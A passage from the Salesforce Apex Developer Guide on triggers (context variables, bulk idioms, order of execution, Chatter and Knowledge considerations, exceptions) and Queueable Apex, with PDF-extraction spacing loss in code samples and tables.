List<Contact>contacts= new List<Contact>();
for (Accounta : Trigger.new) {
if(a.Name== 'makeContact') {
268
Invoking ApexApex Developer Guide

contacts.add(new Contact(LastName= a.Name,
AccountId= a.Id));
}
}
insertcontacts;
}
}
}}}
SEE ALSO:
Apex Reference Guide: TriggerOperation Enum
Switch Statements
Context Variable Considerations
Be aware of the following considerations for trigger context variables:
•
trigger.new and trigger.old cannot be used in Apex DML operations.
•
You can use an object to change its own field values using trigger.new, but only in before triggers. In all after triggers,
trigger.new is not saved, so a runtime exception is thrown.
•
trigger.old is always read-only.
•
You cannot delete trigger.new.
The following table lists considerations about certain actions in different trigger events:
Can delete original object
using a delete DML
operation
Can update original object
using an update DML
operation
Can change fields using
trigger.new
Trigger Event
Not applicable. The original
object has not been created;
Not applicable. The original
object has not been created;
Allowed.beforeinsert
nothing can reference it, so
nothing can update it.
nothing can reference it, so
nothing can update it.
Allowed, but unnecessary. The
object is deleted immediately
after being inserted.
Allowed.Not allowed. A runtime error is
thrown, as trigger.new is
already saved.
afterinsert
Not allowed. A runtime error is
thrown.
Not allowed. A runtime error is
thrown.
Allowed.beforeupdate
Allowed. The updates are saved
before the object is deleted, so
Allowed. Even though bad code
could cause an infinite recursion
Not allowed. A runtime error is
thrown, as trigger.new is
already saved.
afterupdate
if the object is undeleted, the
updates become visible.
doing this incorrectly, the error
would be found by the governor
limits.
Not allowed. A runtime error is
thrown. The deletion is already
in progress.
Allowed. The updates are saved
before the object is deleted, so
if the object is undeleted, the
updates become visible.
Not allowed. A runtime error is
thrown. trigger.new is not
available in before delete
triggers.
beforedelete
269
Invoking ApexApex Developer Guide

Can delete original object
using a delete DML
operation
Can update original object
using an update DML
operation
Can change fields using
trigger.new
Trigger Event
Not applicable. The object has
already been deleted.
Not applicable. The object has
already been deleted.
Not allowed. A runtime error is
thrown. trigger.new is not
available in after delete triggers.
afterdelete
Allowed, but unnecessary. The
object is deleted immediately
after being inserted.
Allowed.Not allowed. A runtime error is
thrown.
afterundelete
Common Bulk Trigger Idioms
Although bulk triggers allow developers to process more records without exceeding execution governor limits, they can be more difficult
for developers to understand and code because they involve processing batches of several records at a time. The following sections
provide examples of idioms that should be used frequently when writing in bulk.
Using Maps and Sets in Bulk Triggers
Set and map data structures are critical for successful coding of bulk triggers. Sets can be used to isolate distinct records, while maps
can be used to hold query results organized by record ID.
For example, this bulk trigger from the sample quoting application first adds each pricebook entry associated with the OpportunityLineItem
records in Trigger.new to a set, ensuring that the set contains only distinct elements. It then queries the PricebookEntries for their
associated product color, and places the results in a map. Once the map is created, the trigger iterates through the OpportunityLineItems
in Trigger.new and uses the map to assign the appropriate color.
// Whena new lineitemis addedto an opportunity,thistriggercopiesthe valueof the
// associatedproduct'scolorto the new record.
triggeroppLineTriggeron OpportunityLineItem(beforeinsert) {
// For everyOpportunityLineItemrecord,add its associatedpricebookentry
// to a set so thereare no duplicates.
Set<Id>pbeIds= new Set<Id>();
for (OpportunityLineItemoli : Trigger.new)
pbeIds.add(oli.pricebookentryid);
// Querythe PricebookEntriesfor theirassociatedproductcolorand placethe results
// in a map.
Map<Id,PricebookEntry>entries= new Map<Id,PricebookEntry>(
[selectproduct2.color__cfrompricebookentry
whereid in :pbeIds]);
// Now use the map to set the appropriatecoloron everyOpportunityLineItemprocessed
// by the trigger.
for (OpportunityLineItemoli : Trigger.new)
oli.color__c= entries.get(oli.pricebookEntryId).product2.color__c;
}
270
Invoking ApexApex Developer Guide

Correlating Records with Query Results in Bulk Triggers
Use the Trigger.newMap and Trigger.oldMap ID-to-sObject maps to correlate records with query results. For example, this
trigger from the sample quoting app uses Trigger.oldMap to create a set of unique IDs (Trigger.oldMap.keySet()).
The set is then used as part of a query to create a list of quotes associated with the opportunities being processed by the trigger. For
every quote returned by the query, the related opportunity is retrieved from Trigger.oldMap and prevented from being deleted:
triggeroppTriggeron Opportunity(beforedelete) {
for (Quote__cq : [SELECTopportunity__cFROMquote__c
WHEREopportunity__cIN :Trigger.oldMap.keySet()]){
Trigger.oldMap.get(q.opportunity__c).addError('Cannotdelete
opportunitywitha quote');
}
}
Using Triggers to Insert or Update Records with Unique Fields
When an insert or upsert event causes a record to duplicate the value of a unique field in another new record in that batch, the
error message for the duplicate record includes the ID of the first record. However, it is possible that the error message may not be correct
by the time the request is finished.
When there are triggers present, the retry logic in bulk operations causes a rollback/retry cycle to occur. That retry cycle assigns new
keys to the new records. For example, if two records are inserted with the same value for a unique field, and you also have an insert
event defined for a trigger, the second duplicate record fails, reporting the ID of the first record. However, once the system rolls back the
changes and re-inserts the first record by itself, the record receives a new ID. That means the error message reported by the second
record is no longer valid.
Defining Triggers
Trigger code is stored as metadata under the object with which they are associated.
To define a trigger in Salesforce:
1.From the object management settings for the object whose triggers you want to access, go to Triggers.
Tip: For the Attachment, ContentDocument, and Note standard objects, you can’t create a trigger in the Salesforce user
interface. For these objects, create a trigger using development tools, such as the Developer Console or the Salesforce extensions
for Visual Studio Code. Alternatively, you can also use the Metadata API.
2.In the Triggers list, click New.
3.To specify the version of Apex and the API used with this trigger, click Version Settings. If your organization has installed managed
packages from the AppExchange, you can also specify which version of each managed package to use with this trigger. Associate
the trigger with the most recent version of Apex and the API and each managed package by using the default values for all versions.
You can specify an older version of a managed package if you want to access components or functionality that differs from the most
recent package version.
4.Click Apex Trigger and select the Is Active checkbox if you want to compile and enable the trigger. Leave this checkbox
deselected if you only want to store the code in your organization's metadata. This checkbox is selected by default.
5.In the Body text box, enter the Apex for the trigger. A single trigger can be up to 1 million characters in length.
271
Invoking ApexApex Developer Guide

To define a trigger, use the following syntax:
triggerTriggerNameonObjectName(trigger_events) {
code_block
}
where trigger_events can be a comma-separated list of one or more of the following events:
•
beforeinsert
•
beforeupdate
•
beforedelete
•
afterinsert
•
afterupdate
•
afterdelete
•
afterundelete
Note:
•
A trigger invoked by an insert, delete, or update of a recurring event or recurring task results in a runtime error
when the trigger is called in bulk from the Lightning PlatformAPI.
•
Suppose that you use an after-insert or after-update trigger to change ownership of leads, contacts, or opportunities. If
you use the API to change record ownership, or if a Lightning Experience user changes a record’s owner, no email notification
is sent. To send email notifications to a record’s new owner, set the triggerUserEmail property in DMLOptions to
true.
6.Click Save.
Note:  Triggers are stored with an isValid flag that is set to true as long as dependent metadata has not changed since
the trigger was last compiled. If any changes are made to object names or fields that are used in the trigger, including superficial
changes such as edits to an object or field description, the isValid flag is set to false until the Apex compiler reprocesses
the code. Recompiling occurs when the trigger is next executed, or when a user resaves the trigger in metadata.
If a lookup field references a record that has been deleted, Salesforce clears the value of the lookup field by default. Alternatively,
you can choose to prevent records from being deleted if they’re in a lookup relationship.
The Apex Trigger Editor
The Apex and Visualforce editor has the following functionality:
Syntax highlighting
The editor automatically applies syntax highlighting for keywords and all functions and operators.
Search ()
Search enables you to search for text within the current page, class, or trigger. To use search, enter a string in the Search textbox
and click Find Next.
•
To replace a found search string with another string, enter the new string in the Replace textbox and click replace to replace
just that instance, or Replace All to replace that instance and all other instances of the search string that occur in the page, class,
or trigger.
•
To make the search operation case sensitive, select the Match Case option.
•
To use a regular expression as your search string, select the Regular Expressions option. The regular expressions follow
JavaScript's regular expression rules. A search using regular expressions can find strings that wrap over more than one line.
272
Invoking ApexApex Developer Guide

If you use the replace operation with a string found by a regular expression, the replace operation can also bind regular expression
group variables ($1, $2, and so on) from the found search string. For example, to replace an <h1> tag with an <h2> tag and
keep all the attributes on the original <h1> intact, search for <h1(\s+)(.*)> and replace it with <h2$1$2>.
Go to line ()
This button allows you to highlight a specified line number. If the line is not currently visible, the editor scrolls to that line.
Undo () and Redo ()
Use undo to reverse an editing action and redo to recreate an editing action that was undone.
Font size
Select a font size from the drop-down list to control the size of the characters displayed in the editor.
Line and column position
The line and column position of the cursor is displayed in the status bar at the bottom of the editor. This can be used with go to line
() to quickly navigate through the editor.
Line and character count
The total number of lines and characters is displayed in the status bar at the bottom of the editor.
Triggers and Merge Statements
Merge events do not fire their own trigger events. Instead, they fire delete and update events as follows:
Deletion of losing records
A single merge operation fires a single delete event for all records that are deleted in the merge. To determine which records were
deleted as a result of a merge operation use the MasterRecordId field in Trigger.old. When a record is deleted after
losing a merge operation, its MasterRecordId field is set to the ID of the winning record. The MasterRecordId field is
only set in afterdelete trigger events. If your application requires special handling for deleted records that occur as a result
of a merge, you need to use the afterdelete trigger event.
Update of the winning record
A single merge operation fires a single update event for the winning record only. Any child records that are reparented as a result
of the merge operation do not fire triggers.
For example, if two contacts are merged, only the delete and update contact triggers fire. No triggers for records related to the contacts,
such as accounts or opportunities, fire.
The following is the order of events when a merge occurs:
1.The beforedelete trigger fires.
2.The system deletes the necessary records due to the merge, assigns new parent records to the child records, and sets the
MasterRecordId field on the deleted records.
3.The afterdelete trigger fires.
4.The system does the specific updates required for the master record. Normal update triggers apply.
Triggers and Recovered Records
The afterundelete trigger event only works with recovered records—that is, records that were deleted and then recovered
from the Recycle Bin through the undelete DML statement. These are also called undeleted records.
The afterundelete trigger events only run on top-level objects. For example, if you delete an Account, an Opportunity may also
be deleted. When you recover the Account from the Recycle Bin, the Opportunity is also recovered. If there is an afterundelete
trigger event associated with both the Account and the Opportunity, only the Account afterundelete trigger event executes.
273
Invoking ApexApex Developer Guide

The afterundelete trigger event only fires for custom objects and these standard objects.
•
Account
•
Asset
•
Campaign
•
Case
•
Contact
•
ContentDocument
•
Contract
•
Event
•
Lead
•
Opportunity
•
Product
•
Solution
•
Task
Triggers and Order of Execution
When you save a record with an insert, update, or upsert statement, Salesforce performs a sequence of events in a certain
order.
Before Salesforce executes these events on the server, the browser runs JavaScript validation if the record contains any dependent picklist
fields. The validation limits each dependent picklist field to its available values. No other validation occurs on the client side.
Note:  For a diagrammatic representation of the order of execution, see the Order of Execution Flowchart in the Salesforce Data
Model Gallery. The diagram is specific to the API version indicated on it, and can be out-of-sync with the information here. This
Apex Developer Guide page contains the most up-to-date information on the order of execution for this API version. To access a
different API version, use the version picker for the Apex Developer Guide.
On the server, Salesforce performs events in this sequence.
Note:  During a recursive save, Salesforce skips steps 9 (assignment rules) through 17 (roll-up summary field in the grandparent
record).
1.Loads the original record from the database or initializes the record for an upsert statement.
2.Loads the new record field values from the request and overwrites the old values.
Salesforce performs different validation checks depending on the type of request.
•
For requests from a standard UI edit page, Salesforce runs these system validation checks on the record:
–
Compliance with layout-specific rules
–
Required values at the layout level and field-definition level
–
Valid field formats
–
Maximum field length
Additionally, if the request is from a User object on a standard UI edit page, Salesforce runs custom validation rules.
•
For requests from multiline item creation such as quote line items and opportunity line items, Salesforce runs custom validation
rules.
274
Invoking ApexApex Developer Guide

•
For requests from other sources such as an Apex application or a SOAP API call, Salesforce validates foreign keys, field formats,
maximum field lengths, and restricted picklists. Before executing a trigger, Salesforce verifies that any custom foreign keys don’t
refer to the object itself.
3.Executes record-triggered flows that are configured to run before the record is saved.
4.Executes all before triggers.
5.Runs most system validation steps again, such as verifying that all required fields have a non-null value, and runs any custom
validation rules. The only system validation that Salesforce doesn't run a second time (when the request comes from a standard UI
edit page) is the enforcement of layout-specific rules.
6.Executes duplicate rules. If the duplicate rule identifies the record as a duplicate and uses the block action, the record isn’t saved
and no further steps, such as after triggers and workflow rules, are taken.
7.Saves the record to the database, but doesn't commit yet.
8.Executes all after triggers.
9.Executes assignment rules.
10.Executes auto-response rules.
11.Executes workflow rules. If there are workflow field updates:
Note:  This sequence applies only to workflow rules.
a.Updates the record again.
b.Runs system validations again. Custom validation rules, flows, duplicate rules, processes built with Process Builder, and escalation
rules aren’t run again.
c.Executes beforeupdate triggers and afterupdate triggers, regardless of the record operation (insert or update),
one more time (and only one more time)
12.Executes escalation rules.
13.Executes these Salesforce Flow automations, but not in a guaranteed order.
•
Processes built with Process Builder
•
Flows launched by workflow rules (flow trigger workflow actions pilot)
Note:  To control the order of execution of Salesforce Flow automations, use record-triggered flows. See Manage
Record-Triggered Flows
When a process or flow executes a DML operation, the affected record goes through the save procedure.
14.Executes record-triggered flows that are configured to run after the record is saved
15.Executes entitlement rules.
16.If the record contains a roll-up summary field or is part of a cross-object workflow, performs calculations and updates the roll-up
summary field in the parent record. Parent record goes through save procedure.
17.If the parent record is updated, and a grandparent record contains a roll-up summary field or is part of a cross-object workflow,
performs calculations and updates the roll-up summary field in the grandparent record. Grandparent record goes through save
procedure.
18.Executes Criteria Based Sharing evaluation.
19.Commits all DML operations to the database.
20.After the changes are committed to the database, executes post-commit logic. Examples of post-commit logic (in no particular
order) include:
275
Invoking ApexApex Developer Guide

Sending email
•
•
Enqueued asynchronous Apex jobs, including queueable jobs and future methods
•
Asynchronous paths in record-triggered flows
Additional Considerations
Note these considerations when working with triggers.
•
If a workflow rule field update is triggered by a record update, Trigger.old doesn’t hold the newly updated field by the workflow
after the update. Instead, Trigger.old holds the object before the initial record update was made. For example, an existing
record has a number field with an initial value of 1. A user updates this field to 10, and a workflow rule field update fires and increments
it to 11. In the update trigger that fires after the workflow field update, the field value of the object obtained from Trigger.old
is the original value of 1, and not 10. See Trigger.old values before and after update triggers.
•
If a DML call is made with partial success allowed, triggers are fired during the first attempt and are fired again during subsequent
attempts. Because these trigger invocations are part of the same transaction, static class variables that are accessed by the trigger
aren't reset. See Bulk DML Exception Handling.
•
If more than one trigger is defined on an object for the same event, the order of trigger execution isn't guaranteed. For example, if
you have two beforeinsert triggers for Case and a new Case record is inserted. The firing order of these two triggers isn’t
guaranteed.
•
To learn about the order of execution when you insert a non-private contact in your org that associates a contact to multiple accounts,
see AccountContactRelation.
•
To learn about the order of execution when you’re using before triggers to set Stage and ForecastCategory, see
Opportunity.
•
In API version 53.0 and earlier, after-save record-triggered flows run after entitlements are executed.
SEE ALSO:
Salesforce Help: Triggers for Autolaunched Flows
Operations That Don't Invoke Triggers
Some operations don’t invoke triggers.
Triggers are invoked for data manipulation language (DML) operations that the Java application server initiates or processes. Therefore,
some system bulk operations don't invoke triggers. Some examples include:
•
Cascading delete operations. Records that did not initiate a delete don't cause trigger evaluation.
•
Cascading updates of child records that are reparented as a result of a merge operation
•
Mass campaign status changes
•
Mass division transfers
•
Mass address updates
•
Mass approval request transfers
•
Mass email actions
•
Modifying custom field data types
•
Renaming or replacing picklists
•
Managing price books
•
Changing a user's default division with the transfer division option checked
276
Invoking ApexApex Developer Guide

•
Changes to the following objects:
–
BrandTemplate
–
MassEmailTemplate
–
Folder
•
Update account triggers don't fire before or after a business account record type is changed to person account (or a person account
record type is changed to business account.)
•
Update triggers don’t fire on FeedItem when the LikeCount counter increases.
Note:  Inserts, updates, and deletes on person accounts fire Account triggers, not Contact triggers.
The before triggers associated with the following operations are fired during lead conversion only if validation and triggers for lead
conversion are enabled in the organization:
•
insert of accounts, contacts, and opportunities
•
update of accounts and contacts
Opportunity triggers are not fired when the account owner changes as a result of the associated opportunity's owner changing.
The before and after triggers and the validation rules don't fire for an opportunity when:
•
You modify an opportunity product on an opportunity.
•
An opportunity product schedule changes an opportunity product, even if the opportunity product changes the opportunity.
However, roll-up summary fields do get updated, and workflow rules associated with the opportunity do run.
The getContent and getContentAsPDF PageReference methods aren't allowed in triggers.
Note the following for the ContentVersion object:
•
Content pack operations involving the ContentVersion object, including slides and slide autorevision, don't invoke triggers.
Note:  Content packs are revised when a slide inside the pack is revised.
•
Values for the TagCsv and VersionData fields are only available in triggers if the request to create or update ContentVersion
records originates from the API.
•
You can't use before or afterdelete triggers with the ContentVersion object.
Triggers on the Attachment object don’t fire when:
•
the attachment is created via Case Feed publisher.
•
the user sends email via the Email related list and adds an attachment file.
Triggers fire when the Attachment object is created via Email-to-Case or via the UI.
Entity and Field Considerations in Triggers
When you create triggers, consider the behavior of certain entities, fields, and operations.
277
Invoking ApexApex Developer Guide

QuestionDataCategorySelection Entity Not Available in After Insert Triggers
The afterinsert trigger that fires after inserting one or more Question records doesn’t have access to the
QuestionDataCategorySelection records that are associated with the inserted Questions. For example, the following
query doesn’t return any results in an afterinsert trigger:
QuestionDataCategorySelection[]dcList=
[selectId,DataCategoryNamefromQuestionDataCategorySelectionwhereParentIdIN :questions];
Fields Not Updateable in Before Triggers
Some field values are set during the system save operation, which occurs after before triggers have fired. As a result, these fields
cannot be modified or accurately detected in beforeinsert or beforeupdate triggers. Some examples include:
•
Task.isClosed
•
Opportunity.amount*
•
Opportunity.ForecastCategory
•
Opportunity.isWon
•
Opportunity.isClosed
•
Contract.activatedDate
•
Contract.activatedById
•
Case.isClosed
•
Solution.isReviewed
•
Id (for all records)**
•
createdDate (for all records)**
•
lastUpdated (for all records)
•
Event.WhoId (when Shared Activities is enabled)
•
Task.WhoId (when Shared Activities is enabled)
* When Opportunity has no lineitems, Amount can be modified by a before trigger.
** Id and createdDate can be detected in beforeupdate triggers, but cannot be modified.
Fields Not Updateable in After Triggers
The following fields can’t be updated by afterinsert or afterupdate triggers.
•
Event.WhoId
•
Task.WhoId
Considerations for Event DateTime Fields in Insert and Update Triggers
We recommend using the following date and time fields to create or update events.
•
When creating or updating a timed Event, use ActivityDateTime to avoid issues with inconsistent date and time values.
•
When creating or updating an all-day Event, use ActivityDate to avoid issues with inconsistent date and time values.
•
We recommend that you use DurationInMinutes because it works with all updates and creates for Events.
278
Invoking ApexApex Developer Guide

Operations Not Supported in Insert and Update Triggers
The following operations aren’t supported in insert and update triggers.
•
Manipulating an activity relation through the TaskRelation or EventRelation object, if Shared Activities is enabled
•
Manipulating an invitee relation on a group event through the Invitee object, whether or not Shared Activities is enabled
Entities Not Supported in After Undelete Triggers
Certain objects can’t be restored, and therefore, shouldn’t have afterundelete triggers.
•
CollaborationGroup
•
CollaborationGroupMember
•
FeedItem
•
FeedComment
Considerations for Update Triggers
Field history tracking honors the permissions of the current user. If the current user doesn’t have permission to directly edit an object or
field, but the user activates a trigger that changes an object or field with history tracking enabled, no history of the change is recorded.
Considerations for the Salesforce Side Panel for Salesforce for Outlook
When an email is associated to a record using the Salesforce Side Panel for Salesforce for Outlook, the email associations are represented
in the WhoId or WhatId fields on a task record. Associations are completed after the task is created, so the Task.WhoId and
Task.WhatId fields aren’t immediately available in before or after Task triggers for insert and update events, and their values
are initially null. The WhoId and WhatId fields are set on the saved task record in a subsequent operation, however, so their values
can be retrieved later.
SEE ALSO:
Triggers for Chatter Objects
Triggers for Chatter Objects
You can write triggers for the FeedItem and FeedComment objects.
Trigger Considerations for FeedItem, FeedAttachment, and FeedComment
•
Only FeedItems of type TextPost, QuestionPost, LinkPost, HasLink, ContentPost, and HasContent can be
inserted, and therefore invoke the before or afterinsert trigger. User status updates don't cause the FeedItem triggers
to fire.
•
While FeedPost objects were supported for API versions 18.0, 19.0, and 20.0, don't use any insert or delete triggers saved against
versions before 21.0.
•
For FeedItem, the following fields aren’t available in the beforeinsert trigger:
–
ContentSize
–
ContentType
In addition, the ContentData field isn’t available in any delete trigger.
279
Invoking ApexApex Developer Guide

•
Triggers on FeedItem objects run before their attachment and capabilities information is saved, which means that
ConnectApi.FeedItem.attachment information and ConnectApi.FeedElement.capabilities information
may not be available in the trigger.
The attachment and capabilities information may not be available from these methods:
ConnectApi.ChatterFeeds.getFeedItem, ConnectApi.ChatterFeeds.getFeedElement,
ConnectApi.ChatterFeeds.getFeedPoll, ConnectApi.ChatterFeeds.getFeedElementPoll,
ConnectApi.ChatterFeeds.postFeedItem, ConnectApi.ChatterFeeds.postFeedElement,
ConnectApi.ChatterFeeds.shareFeedItem, ConnectApi.ChatterFeeds.shareFeedElement,
ConnectApi.ChatterFeeds.voteOnFeedPoll, and ConnectApi.ChatterFeeds.voteOnFeedElementPoll
•
FeedAttachment isn’t a triggerable object. You can access feed attachments in FeedItem update triggers through a SOQL query. For
example:
triggerFeedItemTriggeron FeedItem(afterupdate) {
List<FeedAttachment>attachments=  [SELECTId, Title,Type,FeedEntityId
FROMFeedAttachment
WHEREFeedEntityIdIN :Trigger.new ];
for (FeedAttachmentattachment: attachments){
System.debug(attachment.Type);
}
}
•
When you insert a feed item with associated attachments, the FeedItem is inserted first, then the FeedAttachment records are
created. On update of a feed item with associated attachments, the FeedAttachment records are inserted first, then the FeedItem
is updated. As a result of this sequence of operations, in Salesforce Classic FeedAttachment is available in Update and
AfterInsert triggers. When the attachment is done through Lightning Experience, it’s available in both the Update and
AfterInsert triggers; but in the AfterInsert trigger, use the future method to access FeedAttachments.
•
The following feed attachment operations cause the FeedItem update triggers to fire.
–
A FeedAttachment is added to a FeedItem and causes the FeedItem type to change.
–
A FeedAttachment is removed from a FeedItem and causes the FeedItem type to change.
•
FeedItem triggers aren’t fired when inserting or updating a FeedAttachment that doesn’t cause a change on the associated FeedItem.
•
You can’t insert, update, or delete FeedAttachments in before update and after update FeedItem triggers.
•
For FeedComment before insert and after insert triggers, the fields of a ContentVersion associated with the FeedComment (obtained
through FeedComment.RelatedRecordId) aren’t available.
Other Chatter Trigger Considerations
•
Apex code uses extra security when executing in a Chatter context. To post to a private group, the user running the code must be
a member of that group. If the running user isn't a member, you can set the CreatedById field to be a member of the group in
the FeedItem record.
280
Invoking ApexApex Developer Guide

•
When CollaborationGroupMember is updated, CollaborationGroup is automatically updated as well to ensure that the member
count is correct. As a result, when CollaborationGroupMember update or delete triggers run, CollaborationGroup update
triggers run as well.
SEE ALSO:
Entity and Field Considerations in Triggers
Object Reference for Salesforce and Lightning Platform: FeedItem
Object Reference for Salesforce and Lightning Platform: FeedAttachment
Object Reference for Salesforce and Lightning Platform: FeedComment
Object Reference for Salesforce and Lightning Platform: CollaborationGroup
Object Reference for Salesforce and Lightning Platform: CollaborationGroupMember
Trigger Considerations for Knowledge Articles
You can write triggers for KnowledgeArticleVersion objects. Learn when you can use triggers, and which actions don’t fire triggers, like
archiving articles.
In general, KnowledgeArticleVersion (KAV) records can use these triggers:
•
Creating a KAV record calls the beforeinsert and afterinsert triggers. This includes creating an article, and creating
drafts from archived, published, and master-language articles using the Restore, Edit as Draft, and Submit for Translation actions.
•
Editing an existing KAV record calls the beforeupdate and afterupdate triggers.
•
Deleting a KAV record calls the beforedelete and afterdelete triggers.
•
Importing articles calls the beforeinsert and afterinsert triggers. Importing articles with translations also calls the
beforeupdate and afterupdate triggers.
Actions that change the publication status of a KAV record, such as Publish and Archive, do not fire Apex or flow triggers. However,
sometimes publishing an article from the UI causes the article to be saved, and in these instances the beforeupdate and after
update triggers are called.
Knowledge Actions and Apex Triggers
Consider the following when writing Apex triggers for actions on KnowledgeArticleVersion:
Save, Save and Close
When an article is saved, the beforeupdate and afterupdate triggers are called. When a new article is saved for the
first time, the beforeinsert and afterinsert triggers work instead.
Edit, Edit as Draft
•
When a draft translation is edited, you can use the beforeupdate and afterupdate triggers.
•
The Edit as Draft action creates a draft from a published article, so the beforeinsert and afterinsert triggers fire.
•
In Salesforce Classic, no triggers fire when a draft master-language article is edited.
•
In Salesforce Classic, the beforeinsert and afterinsert triggers are called when editing an archived article from
the Article Management tab. This creates a draft KAV record.
Cancel, Delete
The beforedelete and afterdelete triggers are called in these cases:
•
When deleting a translation draft.
281
Invoking ApexApex Developer Guide

•
From the Article Management or Knowledge tab in Salesforce Classic, after editing a published article and then clicking Cancel.
This deletes the new draft.
Submit for Translation
This action creates a draft translation, so you can generally use the beforeinsert and afterinsert triggers. In Salesforce
Classic, you can use the beforeupdate and afterupdate triggers when you create a new article from the Knowledge
tab, save it, and then submit for translation. The beforeupdate and afterupdate triggers fire when the master-language
article is currently being edited, but not from list views or when viewing the article.
Assign
The beforeupdate and afterupdate triggers are called only when doing so causes a record save first. This happens
when the article is being edited before the Assign button is clicked.
Actions That Don’t Fire Triggers
These actions can’t fire Apex triggers:
•
Undelete articles from the recycle bin.
•
Preview and archive articles.
Impact on Lightning Migration
Migrating from Knowledge in Salesforce Classic to Lightning Knowledge affects Apex triggers. Writing an Apex trigger on
KnowledgeArticleVersion objects creates dependencies and prevents the KAV object from being deleted. When you migrate an org with
multiple article types to Lightning Knowledge, you must remove any Apex triggers that reference the KAV article types. During migration,
admins see an error message if Apex triggers still reference the article type KAV objects that are deleted during migration. If you cancel
Lightning Knowledge migration while Apex triggers exist that refer to the new KAV object, admins are notified and you must remove
the Apex code.
Sample Knowledge Trigger
For example, you can define a trigger that enters summary text when an article is created.
triggerKAVTriggeron KAV_Type__kav(beforeinsert) {
for (KAV_Type__kavkav : Trigger.New){
kav.Summary__c= 'Updatedarticlesummarybeforeinsert';
}
}
Trigger Exceptions
Triggers can be used to prevent DML operations from occurring by calling the addError() method on a record or field. When used
on Trigger.new records in insert and update triggers, and on Trigger.old records in delete triggers, the custom
error message is displayed in the application interface and logged.
Note:  Users experience less of a delay in response time if errors are added to before triggers.
A subset of the records being processed can be marked with the addError() method:
•
If the trigger was spawned by a DML statement in Apex, any one error results in the entire operation rolling back. However, the
runtime engine still processes every record in the operation to compile a comprehensive list of errors.
•
If the trigger was spawned by a bulk DML call in the Lightning Platform API, the runtime engine sets aside the bad records and
attempts to do a partial save of the records that did not generate errors. See Bulk DML Exception Handling on page 162.
282
Invoking ApexApex Developer Guide

If a trigger ever throws an unhandled exception, all records are marked with an error and no further processing takes place.
SEE ALSO:
Apex Reference Guide: SObject.addError()
Trigger and Bulk Request Best Practices
A common development pitfall is the assumption that trigger invocations never include more than one record. Apex triggers are optimized
to operate in bulk, which, by definition, requires developers to write logic that supports bulk operations.
This is an example of a flawed programming pattern. It assumes that only one record is pulled in during a trigger invocation. While this
might support most user interface events, it does not support bulk operations invoked through SOAP API or Visualforce.
triggerMileageTriggeron Mileage__c(beforeinsert, beforeupdate) {
Userc = [SELECTId FROMUserWHEREmileageid__c= :Trigger.new[0].id];
}
This is another example of a flawed programming pattern. It assumes that fewer than 100 records are in scope during a trigger invocation.
If more than 100 queries are issued, the trigger would exceed the SOQL query limit.
triggerMileageTriggeron Mileage__c(beforeinsert, beforeupdate) {
for(mileage__cm : Trigger.new){
Userc = [SELECTId FROMuserWHEREmileageid__c= :m.Id];
}
}
For more information on governor limits, see Execution Governors and Limits.
This example demonstrates the correct pattern to support the bulk nature of triggers while respecting the governor limits:
TriggerMileageTriggeron Mileage__c(beforeupdate) {
Set<ID> ids = Trigger.newMap.keySet();
List<User>c = [SELECTId FROMuserWHEREmileageid__cin :ids];
}
This pattern respects the bulk nature of the trigger by passing the Trigger.new collection to a set, then using the set in a single
SOQL query. This pattern captures all incoming records within the request while limiting the number of SOQL queries.
Best Practices for Designing Bulk Programs
The following are the best practices for this design pattern:
•
Minimize the number of data manipulation language (DML) operations by adding records to collections and performing DML
operations against these collections.
•
Minimize the number of SOQL statements by preprocessing records and generating sets, which can be placed in single SOQL
statement used with the IN clause.
SEE ALSO:
Developing Code in the Cloud
Asynchronous Apex
Apex offers multiple ways for running your Apex code asynchronously. Choose the asynchronous Apex feature that best suits your needs.
283
Invoking ApexApex Developer Guide

This table lists the asynchronous Apex features and when to use each.
When to UseAsynchronous Apex Feature
Queueable Apex
•
To start a long-running operation and get an ID for it
•
To pass complex types to a job
•
To chain jobs
Scheduled Apex
•
To schedule an Apex class to run on a specific schedule
Batch Apex
•
For long-running jobs with large data volumes that need to
be performed in batches, such as database maintenance jobs
•
For jobs that need larger query results than regular transactions
allow
Future Methods
•
When you have a long-running method and need to prevent
delaying an Apex transaction
•
When you make callouts to external Web services
•
To segregate DML operations and bypass the mixed save DML
error
Queueable Apex
Take control of your asynchronous Apex processes by using the Queueable interface. This interface enables you to add jobs to
the queue and monitor them. Using the interface is an enhanced way of running your asynchronous Apex code compared to using
future methods.
Apex Scheduler
Use the Apex Scheduler to delay execution so that you can run Apex classes at a specified time. This is ideal for daily or weekly
maintenance tasks using Batch Apex.
Batch Apex
Future Methods
Queueable Apex
Take control of your asynchronous Apex processes by using the Queueable interface. This interface enables you to add jobs to the
queue and monitor them. Using the interface is an enhanced way of running your asynchronous Apex code compared to using future
methods.
Apex processes that run for a long time, such as extensive database operations or external web service callouts, can be run asynchronously
by implementing the Queueable interface and adding a job to the Apex job queue. In this way, your asynchronous Apex job runs
in the background in its own thread and doesn’t delay the execution of your main Apex logic. Each queued job runs when system
resources become available. A benefit of using the Queueable interface methods is that some governor limits are higher than for
synchronous Apex, such as heap size limits.
Important:  If an Apex transaction rolls back, any queueable jobs queued for execution by the transaction aren’t processed.
284
Invoking ApexApex Developer Guide

Queueable jobs are similar to future methods in that they’re both queued for execution, but they provide you with these additional
benefits.
•
Getting an ID for your job: When you submit your job by invoking the System.enqueueJob method, the method returns the
ID of the new job. This ID corresponds to the ID of the AsyncApexJob record. Use this ID to identify and monitor your job, either
through the Salesforce UI (Apex Jobs page), or programmatically by querying your record from AsyncApexJob.
•
Using non-primitive types: Your queueable class can contain member variables of non-primitive data types, such as sObjects or
custom Apex types. Those objects can be accessed when the job executes.
•
Chaining jobs: You can chain one job to another job by starting a second job from a running job. Chaining jobs is useful if your
process depends on another process to have run first.
You can set a maximum stack depth of chained Queueable jobs, overriding the default limit of five in Developer and Trial Edition
organizations.
Note:  Variables that are declared transient are ignored by serialization and deserialization and the value is set to null in
Queueable Apex.
Adding a Queueable Job to the Asynchronous Execution Queue
This example implements the Queueable interface. The execute method in this example inserts a new account. The
System.enqueueJob(queueable) method is used to add the job to the queue.
publicclassAsyncExecutionExampleimplementsQueueable{
publicvoidexecute(QueueableContextcontext){
Accounta = new Account(Name='Acme',Phone='(415)555-1212');
inserta;
}
}
To add this class as a job on the queue, call this method:
ID jobID= System.enqueueJob(new AsyncExecutionExample());
Important:  When you call System.enqueueJob, Salesforce adds the process to the queue. Actual execution can be delayed
based on service availability.
After you submit your queueable class for execution, the job is added to the queue and will be processed when system resources become
available. You can monitor the status of your job programmatically by querying AsyncApexJob or through the user interface in Setup
by entering ApexJobs in the QuickFind box, then selecting Apex Jobs.
To query information about your submitted job, perform a SOQL query on AsyncApexJob by filtering on the job ID that the
